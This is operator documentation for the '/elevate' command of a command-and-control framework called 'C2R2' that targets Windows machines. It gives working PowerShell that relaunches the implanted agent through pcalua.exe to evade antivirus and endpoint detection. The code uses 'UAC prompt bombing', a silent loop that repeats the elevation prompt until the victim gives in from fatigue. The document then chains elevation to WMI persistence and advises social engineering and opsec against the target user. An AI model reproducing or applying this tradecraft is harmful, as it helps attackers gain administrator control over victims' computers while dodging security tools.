# Privilege Escalation: /elevate Command

## Overview

The `/elevate` command allows executing commands with administrator privileges on the target Windows system by triggering a UAC (User Account Control) prompt.

## Usage

```bash
C2R2 [ID]> /elevate
```

### Examples

```bash
# Re-execute agent with admin privileges
C2R2 [1]> /elevate

# This will:
# 1. Re-execute the agent with admin privileges using pcalua.exe (LOLBAS)
# 2. Show UAC prompt repeatedly until user accepts
# 3. Close current connection
# 4. Elevated agent reconnects automatically
# 5. All subsequent commands run with admin privileges

# After elevation succeeds, run admin commands normally
C2R2 [1]> /cmd whoami /priv
C2R2 [1]> /persist wmi
```

## How It Works

1. **Server Side**: The `/elevate` command sends a `__ELEVATE__` message to the selected agent
2. **Agent Side**: The agent receives the command and:
   - Obtains its own executable path
   - Uses **LOLBAS** technique with `pcalua.exe` (Program Compatibility Assistant)
   - Implements **UAC Prompt Bombing** - continuously shows UAC prompt until accepted
   - This triggers the Windows UAC prompt on the target system repeatedly
   - If the user approves, the agent re-executes with elevated privileges
   - The elevated agent automatically reconnects to the C2 server

## Technical Details

### LOLBAS + UAC Prompt Bombing

The agent now uses an improved technique combining:

**1. Living Off the Land (LOLBAS):**
- Uses `pcalua.exe` (Program Compatibility Assistant) instead of direct PowerShell
- `pcalua.exe` is a legitimate Windows binary, appearing less suspicious
- Located at `C:\Windows\System32\pcalua.exe`

**2. UAC Prompt Bombing:**
- Continuously displays the UAC prompt until the user accepts
- Uses a PowerShell loop that won't stop until elevation is approved
- Error handling is silent to avoid detection

### PowerShell Implementation

**Primary Method (pcalua.exe):**

```powershell
try {
    throw ""
} catch {
    while (-not $?) {
        try {
            Start-Process pcalua.exe -ArgumentList "-a \"<agent_path>\"" -Verb RunAs -ErrorAction Stop
            break
        } catch {
            Write-Error "" -ErrorAction SilentlyContinue
        }
    }
}
```

**Fallback Method (Direct PowerShell):**

If `pcalua.exe` fails for any reason, the agent falls back to:

```powershell
try {
    throw ""
} catch {
    while (-not $?) {
        try {
            Start-Process -FilePath '<agent_path>' -Verb RunAs -ErrorAction Stop
            break
        } catch {
            Write-Error "" -ErrorAction SilentlyContinue
        }
    }
}
```

**Key Features:**
- `while (-not $?)` - Loop continues until success (no error state)
- `-ErrorAction Stop` - Treats UAC rejection as a catchable error
- `Write-Error "" -ErrorAction SilentlyContinue` - Suppresses error output
- `break` - Exits loop only on successful elevation
- `pcalua.exe -a` - Uses LOLBAS to launch the agent

### Security Considerations

**Persistence of UAC Prompts:**
- The UAC prompt will **continuously reappear** until accepted or process is killed
- This creates pressure on the user to accept the elevation
- More effective than single UAC prompt but also more noticeable

**LOLBAS Benefits:**
- Uses legitimate Windows binary (`pcalua.exe`)
- Less likely to be flagged by AV/EDR than direct PowerShell elevation
- Appears as "Program Compatibility Assistant" in UAC prompt
- Part of Microsoft Application Compatibility Toolkit

**User Interaction Required:**
- Target user must eventually click "Yes" on the UAC prompt
- User can still click "No", but prompt will reappear
- Prompt bombing increases likelihood of acceptance through fatigue
- This is a social engineering technique, not a bypass

**Social Engineering Context:**
- Most effective during active user sessions
- Can be combined with legitimate-looking context or installer
- UAC prompt shows "Program Compatibility Assistant" as the publisher
- Less suspicious than showing PowerShell or unknown executable

## Alternative Approaches

The following approaches were considered or previously implemented:

1. **VBScript Elevation** (Previous): Used VBScript with ShellExecute - now replaced with LOLBAS
2. **Legitimate Installer**: Package the agent as part of a legitimate-looking installer
3. **Manual LPE Exploitation**: Use specific LPE exploits for vulnerable systems
4. **Service Manipulation**: If agent already has service privileges, create/modify services

## Limitations

- **Requires User Approval**: UAC prompt must eventually be accepted
- **Highly Visible**: Continuous UAC prompts are very noticeable to the user
- **Detection Risk**: Repeated UAC prompts may be logged by EDR/SIEM
- **No Bypass**: Does not bypass Windows security controls
- **Can Be Stopped**: User can kill the PowerShell process to stop prompt bombing

## Best Practices

1. **Timing**: Execute when user is actively using the system and may expect prompts
2. **Context**: Use with social engineering or legitimate cover story
3. **Patience**: UAC prompt bombing works through user fatigue - may take time
4. **OpSec**: Be aware that repeated UAC prompts are highly suspicious to security-aware users
5. **Fallback**: Have alternative privilege escalation methods ready

## Integration with Persistence

The `/elevate` command can be combined with `/persist` to establish admin-level persistence:

```bash
# First elevate agent privileges
C2R2 [1]> /elevate

# Wait for UAC to be accepted and elevated agent to reconnect
# (may take some time due to UAC prompt bombing)

# Once reconnected with admin privileges, establish WMI persistence
C2R2 [1]> /persist wmi
```

## Response Format

### Success
```
__SUCCESS__:Agente re-ejecutado con privilegios elevados (LOLBAS: pcalua.exe). UAC prompt se mostrará hasta que sea aceptado. Conexión actual se cerrará. El agente elevado se reconectará automáticamente.
```

### Fallback Success (PowerShell)
```
__SUCCESS__:Agente re-ejecutado con privilegios elevados (PowerShell + UAC bombing). UAC prompt se mostrará hasta que sea aceptado. Conexión actual se cerrará. El agente elevado se reconectará automáticamente.
```

### Failure
```
__ERROR__:Error al re-ejecutar agente con privilegios: <error>
```

## See Also

- `/persist` - Establish persistence mechanisms
- `/cmd` - Execute regular commands without elevation
- [Windows UAC Documentation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/)
